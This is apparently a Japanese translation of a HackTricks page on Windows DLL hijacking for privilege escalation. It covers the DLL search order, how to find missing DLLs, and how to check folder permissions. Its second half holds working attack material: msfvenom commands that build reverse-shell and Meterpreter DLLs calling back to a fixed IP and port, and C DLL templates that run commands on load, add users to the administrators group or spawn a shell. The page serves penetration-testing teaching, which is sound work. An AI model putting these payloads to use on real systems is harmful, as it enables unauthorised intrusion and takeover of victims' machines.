# Dll Hijacking

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**する。
- **ハッキングトリックを共有する**には、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ハッキングキャリア**に興味がある方や**解読不能なものをハック**したい方 - **採用中**です！（_流暢なポーランド語の読み書きが必要です_）。

{% embed url="https://www.stmcyber.com/careers" %}

## 基本情報

DLLハイジャッキングは、信頼されたアプリケーションを悪意のあるDLLを読み込むように操作することを指します。この用語には、**DLLスプーフィング、インジェクション、およびサイドローディング**などの戦術が含まれます。主にコードの実行、持続性の達成、そして稀に特権昇格に使用されます。ここでは昇格に焦点を当てていますが、ハイジャッキングの方法は目的に関係なく一貫しています。

### 一般的な技術

DLLハイジャッキングには、アプリケーションのDLL読み込み戦略に依存する効果が異なるいくつかの方法があります。

1. **DLLの置換**: 正規のDLLを悪意のあるDLLと交換し、オプションでDLLプロキシングを使用して元のDLLの機能を保持します。
2. **DLLサーチオーダーハイジャッキング**: 悪意のあるDLLを正規のDLLの前に検索パスに配置し、アプリケーションの検索パターンを悪用します。
3. **ファントムDLLハイジャッキング**: アプリケーションが読み込む必要があるDLLが存在しないと思い込ませるために悪意のあるDLLを作成します。
4. **DLLリダイレクション**: `%PATH%`や`.exe.manifest` / `.exe.local`ファイルなどの検索パラメータを変更して、アプリケーションを悪意のあるDLLに誘導します。
5. **WinSxS DLLの置換**: WinSxSディレクトリ内の正規のDLLを悪意のあるDLLで置き換える方法であり、DLLサイドローディングとしばしば関連付けられます。
6. **相対パスDLLハイジャッキング**: ユーザーが制御するディレクトリに悪意のあるDLLを配置し、バイナリプロキシ実行技術を模倣します。

## 欠落しているDLLの検出

システム内の欠落しているDLLを見つける最も一般的な方法は、[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)を実行し、**次の2つのフィルターを設定**することです：

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

そして、**ファイルシステムアクティビティ**を表示します：

![](<../../.gitbook/assets/image (314).png>)

**一般的なDLLを検索**する場合は、数秒間これを実行しておきます。\
**特定の実行可能ファイル内の欠落しているDLL**を探している場合は、「プロセス名」が「\<exec name>」を含むような**別のフィルターを設定**し、実行してからイベントのキャプチャを停止します。

## 欠落しているDLLの悪用

特権昇格するためには、**特権プロセスが読み込もうとするDLLを書き込むことができる**最適な方法は、**検索される場所のいずれかにDLLを書き込む**ことです。したがって、**元のDLLよりも前に検索されるフォルダー**にDLLを**書き込む**ことができるか、または**DLLが存在しない**フォルダーにDLLを書き込むことができるかもしれません。

### DLL検索順序

[**Microsoftのドキュメント**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **には、DLLが特定の方法で読み込まれる方法が記載されています。**

**Windowsアプリケーション**は、特定のシーケンスに従って一連の**事前定義された検索パス**に従ってDLLを検索します。DLLハイジャッキングの問題は、有害なDLLがこれらのディレクトリの1つに戦略的に配置され、正規のDLLよりも先に読み込まれるようにすることで発生します。これを防ぐ解決策は、アプリケーションが必要とするDLLを参照する際に絶対パスを使用することを確認することです。

32ビットシステムでの**DLL検索順序**は以下の通りです：

1. アプリケーションが読み込まれたディレクトリ。
2. システムディレクトリ。このディレクトリのパスを取得するには、[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使用します。(_C:\Windows\System32_)
3. 16ビットシステムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索されます。(_C:\Windows\System_)
4. Windowsディレクトリ。このディレクトリのパスを取得するには、[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使用します。(_C:\Windows_)
5. 現在のディレクトリ。
6. PATH環境変数にリストされているディレクトリ。これには、**App Paths**レジストリキーで指定されたアプリケーションごとのパスは含まれません。**App Paths**キーは、DLL検索パスの計算に使用されません。

これが**SafeDllSearchMode**が有効な状態での**デフォルト**の検索順序です。無効にするには、**HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** レジストリ値を作成し、0に設定します（デフォルトは有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が**LOAD\_WITH\_ALTERED\_SEARCH\_PATH**で呼び出されると、検索は**LoadLibraryEx**が読み込んでいる実行可能モジュールのディレクトリから開始されます。

最後に、**絶対パスを指定してDLLを読み込むこともできる**ことに注意してください。その場合、そのDLLは**そのパスのみで検索されます**（DLLに依存関係がある場合、名前で読み込まれるだけです）。

検索順序を変更する他の方法もありますが、ここでは説明しません。

#### WindowsドキュメントのDLL検索順序の例外

Windowsドキュメントには、標準的なDLL検索順序に関する特定の例外が記載されています：

- メモリに読み込まれている**DLLと同じ名前を持つDLL**が見つかった場合、システムは通常の検索をバイパスします。代わりに、リダイレクションとマニフェストのチェックを実行し、メモリにすでにあるDLLにデフォルトで戻ります。**このシナリオでは、システムはDLLの検索を実行しません**。
- DLLが現在のWindowsバージョンの**既知のDLL**として認識される場合、システムはその既知のDLLのバージョンとその依存するDLLを利用し、**検索プロセスをスキップ**します。レジストリキー**HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**には、これらの既知のDLLのリストが格納されています。
- DLLに依存関係がある場合、最初のDLLがフルパスで識別されたかどうかに関係なく、これらの依存するDLLの検索は、**モジュール名のみで指定されたかのように**実行されます。

### 特権昇格

**要件**：

- **異なる特権で動作するプロセス**を特定し、または特定する（水平または垂直移動）、**DLLが欠落している**。
- DLLが**検索される任意のディレクトリに書き込みアクセス**が利用可能であることを確認します。この場所は、実行可能ファイルのディレクトリまたはシステムパス内のディレクトリである可能性があります。

はい、**デフォルトでは特権のある実行可能ファイルが欠落しているDLLを見つけるのはかなり奇妙**であり、**システムパスのフォルダに書き込み権限を持つのはさらに奇妙**です（デフォルトではできません）。ただし、構成が誤っている環境では、これが可能です。\
要件を満たす幸運な状況に自分自身を見つけた場合は、[UACME](https://github.com/hfiref0x/UACME)プロジェクトをチェックしてみてください。プロジェクトの**主な目標はUACをバイパスすること**ですが、おそらく書き込み権限のあるフォルダのパスを変更するだけで使用できるWindowsバージョンのDLLハイジャッキングのPoCを見つけることができます。

フォルダーの**アクセス許可を確認する**には、次のようにします：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして、**PATH内のすべてのフォルダのアクセス許可を確認します**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
次のコマンドを使用して、実行可能ファイルのインポートとDLLのエクスポートを確認することもできます:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**Dll Hijackingを悪用して特権を昇格**するための完全なガイドについては、**System Pathフォルダ**に書き込み権限があるかどうかを確認してください：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### 自動化ツール

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、システムPATH内の任意のフォルダに書き込み権限があるかどうかをチェックします。\
この脆弱性を発見するための他の興味深い自動化ツールには、**PowerSploit functions**があります：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_。

### 例

悪用可能なシナリオを見つけた場合、それを成功裏に悪用するために最も重要なことの1つは、**実行ファイルがそれからインポートするすべての関数を少なくともエクスポートするdllを作成する**ことです。とにかく、Dll Hijackingは、中間インテグリティレベルから高い**（UACをバイパス）**に昇格するか、[**高いインテグリティからSYSTEMに**](./#from-high-integrity-to-system)**昇格する**のに便利です。有効なdllを作成する方法の例は、このdllハイジャッキング研究に焦点を当てたサイトで見つけることができます：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
さらに、**次のセクション**では、**テンプレートとして役立つ基本的なdllコード**をいくつか見つけることができます。また、**必要のない関数がエクスポートされたdllを作成する**ために使用できます。

## **Dllの作成とコンパイル**

### **Dllプロキシ化**

基本的に**Dllプロキシ**は、**ロードされるときに悪意のあるコードを実行**できるDllですが、**実際のライブラリにすべての呼び出しをリレーすることで、公開され、機能する**こともできます。

ツール[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)または[**Spartacus**](https://github.com/Accenture/Spartacus)を使用すると、実際に**実行可能ファイルを指定し、プロキシ化したいライブラリ**を選択して**プロキシ化されたdllを生成**するか、**Dllを指定してプロキシ化されたdllを生成**することができます。

### **Meterpreter**

**rev shellを取得（x64）:**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**メータープリンターを取得する（x86）:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成します（x86バージョンは見当たりませんでした）:**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### あなた自身

複数のケースで、コンパイルしたDllは、被害者プロセスによってロードされる関数を**複数エクスポートする必要があります**。これらの関数が存在しない場合、**バイナリはそれらをロードできず、攻撃は失敗します**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## 参考文献
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ハッキングキャリア**に興味がある方や、**解読不能なものをハック**したい方へ - **採用中です！**（_流暢なポーランド語の読み書きが必要です_）。

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**する
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有する

</details>
